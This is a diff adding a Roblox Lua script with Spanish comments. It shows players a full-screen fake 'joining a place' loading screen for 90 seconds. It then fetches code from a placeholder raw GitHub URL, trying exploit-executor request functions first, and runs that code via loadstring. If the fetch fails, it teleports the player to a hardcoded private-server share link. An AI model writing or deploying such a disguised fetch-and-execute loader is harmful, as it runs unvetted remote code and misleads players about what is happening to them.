@@ -1,0 +1,109 @@
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+
+-- URL raw que contiene el script que quieres ejecutar (reemplaza por la tuya)
+local remoteUrl = "https://raw.githubusercontent.com/USUARIO/REPO/RAMA/ruta/al/archivo.lua"
+
+-- URL/valor antiguo de servidor privado (se usa como fallback para teletransportar)
+local serverShareUrl = "https://www.roblox.com/share?code=57aa40db90476e41ad08389ddd7e6a8f&type=Server"
+
+-- Intenta diversas APIs de HTTP para máxima compatibilidad con distintos ejecutores
+local function httpGet(url)
+    local attempts = {
+        function(u)
+            if syn and syn.request then
+                local r = syn.request({Url = u, Method = "GET"})
+                return r and r.Body
+            end
+        end,
+        function(u)
+            if request then
+                local ok, r = pcall(request, {Url = u, Method = "GET"})
+                if ok then return (r.Body or r) end
+            end
+        end,
+        function(u)
+            if http and http.request then
+                local r = http.request({Url = u, Method = "GET"})
+                return r and r.Body
+            end
+        end,
+        function(u)
+            if http_request then
+                local ok, r = pcall(http_request, {Url = u, Method = "GET"})
+                if ok then return (r.Body or r) end
+            end
+        end,
+        function(u)
+            -- Fallback a HttpService (requiere HttpEnabled)
+            local ok, res = pcall(function() return HttpService:GetAsync(u) end)
+            if ok then return res end
+        end
+    }
+
+    for _, fn in ipairs(attempts) do
+        local ok, res = pcall(fn, url)
+        if ok and type(res) == "string" and #res > 0 then
+            return res
+        end
+    end
+
+    return nil
+end
+
+-- Extrae code/placeId de una URL tipo share y teletransporta al jugador
+local function tryTeleportFromShare(url, player)
+    if not url then return end
+    local code = url:match("code=([^&]+)")
+    local placeId = tonumber(url:match("placeId=(%d+)")) or game.PlaceId
+    if code then
+        pcall(function()
+            TeleportService:TeleportToPlaceInstance(placeId, code, {player})
+        end)
+    end
+end
+
+-- Muestra pantalla de carga, espera y luego intenta ejecutar script remoto o teletransportar
+local function showLoadingScreen(player)
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "LoadingScreen"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = player:WaitForChild("PlayerGui")
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundColor3 = Color3.new(0, 0, 0)
+    frame.BorderSizePixel = 0
+    frame.Parent = screenGui
+
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Size = UDim2.new(1, 0, 1, 0)
+    textLabel.BackgroundTransparency = 1
+    textLabel.TextColor3 = Color3.new(1, 1, 1)
+    textLabel.Text = "Te estás uniendo a un lugar. Espera mientras se carga..."
+    textLabel.TextScaled = true
+    textLabel.Parent = frame
+
+    -- Esperar (igual que antes)
+    wait(90)
+    if screenGui.Parent then screenGui:Destroy() end
+
+    -- 1) Intentar obtener y ejecutar script remoto (loadstring o load)
+    local code = httpGet(remoteUrl)
+    if code then
+        local fn = (loadstring and loadstring(code)) or (load and load(code))
+        if type(fn) == "function" then
+            pcall(fn)
+            return
+        end
+    end
+
+    -- 2) Si falla, intentar teletransportar usando el enlace share de fallback
+    tryTeleportFromShare(serverShareUrl, player)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    -- Ejecutar en hilo protegido
+    spawn(function() showLoadingScreen(player) end)
+end)
